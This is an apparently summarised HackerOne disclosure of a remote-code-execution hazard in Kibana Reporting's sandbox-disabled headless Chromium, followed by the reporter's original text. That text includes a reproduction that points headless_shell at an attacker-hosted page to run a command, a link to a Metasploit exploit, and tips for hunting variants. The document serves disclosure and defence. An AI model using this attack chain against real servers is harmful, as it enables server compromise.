# RCE Hazard in Kibana Reporting via Vulnerable Headless Chromium

## Metadata
- **Source:** HackerOne
- **Report:** 1168765 | https://hackerone.com/reports/1168765
- **Submitted:** 2021-04-19
- **Reporter:** alexbrasetvik
- **Program:** Elastic
- **Bounty:** Not specified
- **Severity:** critical
- **Vuln:** Remote Code Execution, Unsafe Browser Configuration, Sandbox Bypass, Command Injection
- **CVEs:** None
- **Category:** memory-binary

## Summary
Kibana's reporting feature uses a headless Chromium browser invoked with --no-sandbox flag, making it vulnerable to known RCE exploits. An attacker can execute arbitrary code on the server by combining this with HTML injection, XSS, or open redirect vulnerabilities to point the Chromium renderer at malicious JavaScript.

## Attack scenario
1. Attacker identifies an HTML injection or XSS vulnerability in Kibana that can inject malicious content or redirect to attacker-controlled URLs
2. Attacker crafts a malicious HTML page containing JavaScript that exploits a known Chromium RCE vulnerability (e.g., CVE-based exploit)
3. Attacker tricks the reporting feature into rendering their malicious HTML via the vulnerable injection/redirect vector
4. Headless Chromium processes the malicious HTML and executes the embedded JavaScript exploit
5. The exploit leverages the --no-sandbox execution mode to break out of browser confinement
6. Arbitrary commands execute on the reporting server with Kibana/container privileges

## Root cause
Kibana's reporting module uses a headless Chromium instance started with --no-sandbox flag (necessary for container/restricted environments), combined with the browser's inherent RCE vulnerabilities. The attack surface is expanded by potential HTML injection or open redirect flaws that can direct Chromium to attacker-controlled content.

## Attacker mindset
An attacker recognizes that the reporting feature is a trusted internal component processing potentially user-controlled data. By chaining a relatively minor injection flaw with known browser exploits, they can achieve full RCE. The --no-sandbox requirement in containerized environments is seen as an opportunity rather than a security measure.

## Defensive takeaways
- Avoid running headless browsers with --no-sandbox; explore sandboxing alternatives, seccomp profiles, or container isolation techniques
- Validate and sanitize all input that could be passed to the reporting engine, especially URLs and content
- Implement strict CSP headers and prevent open redirects to mitigate initial injection vectors
- Keep Chromium/browser versions patched to the latest security releases
- Run reporting processes with minimal privileges and in isolated containers with restricted capabilities
- Consider using safer PDF/PNG generation libraries that don't require full browser engines
- Implement network segmentation to limit lateral movement from compromised reporting services
- Monitor and restrict outbound connections from reporting processes to untrusted domains

## Variant hunting
Search for other Kibana features that invoke external processes, render user content, or generate reports. Look for similar patterns in: visualization export, email notifications, scheduled tasks, webhook integrations, or any feature accepting URLs or HTML content. Check for other Elastic Stack components (Logstash, Beats) that might embed Chromium or similar interpreters.

## MITRE ATT&CK
- T1190
- T1203
- T1059
- T1055
- T1548
- T1021

## Notes
Reporter demonstrated a proof-of-concept but acknowledged the chain is incomplete without showing how to initially direct Chromium to attacker content. This is a multi-step vulnerability requiring chaining. The Metasploit reference (PR #15007) points to specific CVEs. Versions 7.11 and 7.12 confirmed vulnerable. The vulnerability is particularly dangerous in containerized deployments (ECE, ECK) where --no-sandbox is mandatory.

## Full report
<details><summary>Expand</summary>

**Summary:** Reporting embeds a Chromium that is susceptible to RCEs

**Description:**

Reporting uses a headless Chromium to generate PNGs and PDFs. This is invoked (at least on Elastic Cloud, ECE and ECK) with `--no-sandbox` to work at all.

There are RCEs readily available for Chrome, and at least the versions shipped with 7.11 and 7.12 are susceptible to the attached example.

Attached is an adaptation of this exploit: https://github.com/rapid7/metasploit-framework/pull/15007/files#diff-42ae645fcacbd90d93296471ac57e1d734544af7fb082efd607db0a29d197ac4R53

I have not been able to devise a complete chain yet (thus the "hazard"), but anything that enables pointing reporting at attacker-controlled JS would be able to pop an RCE this way. HTML-injection or XSS (even with the CSP a HTML injection will enable a redirect) or an open redirect would enable pointing reporting at custom JS code.

## Steps To Reproduce:

  1. Host the attached HTML somewhere, in my case it's available on http://192.168.0.154:8009/alexb-says-hi.html
  1. Point the x-pack reporting-embedded Chromium at it (this step is missing to complete the chain)

Here's an example. The attached HTML file gets `uname -a > /tmp/alexb-says-hi` to be run:

```
$ docker run --rm -it docker.elastic.co/kibana/kibana:7.12.0 bash  
bash-4.4$ cd ./x-pack/plugins/reporting/chromium/headless_shell-linux_x64/
bash-4.4$ ls /tmp/
ks-script-esd4my7v  ks-script-eusq_sc5
bash-4.4$ ./headless_shell --no-sandbox http://192.168.0.154:8009/alexb-says-hi.html
[0419/161441.709455:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
[0419/161441.725018:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
[0419/161441.727174:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
[0419/161441.821129:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
^C # CTRL-C after a few seconds. Reporting would kill it after a timeout
bash-4.4$ ls /tmp/
alexb-says-hi  ks-script-esd4my7v  ks-script-eusq_sc5
bash-4.4$ cat /tmp/alexb-says-hi
Linux bd1b285e33b7 4.19.121-linuxkit #1 SMP Thu Jan 21 15:36:34 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

## Supporting Material/References:

  * HTML-file which when accessed via Reporting's headless Chromium triggers an RCE. (Steps to produce that file via msfconsole is embedded in the HTML file as comments)

## Impact

Kibana is an HTML-injection (even without full-blown XSS) or an open redirect away from being RCE-able via Reporting.

</details>

---
*Analysed by Claude on 2026-05-12*
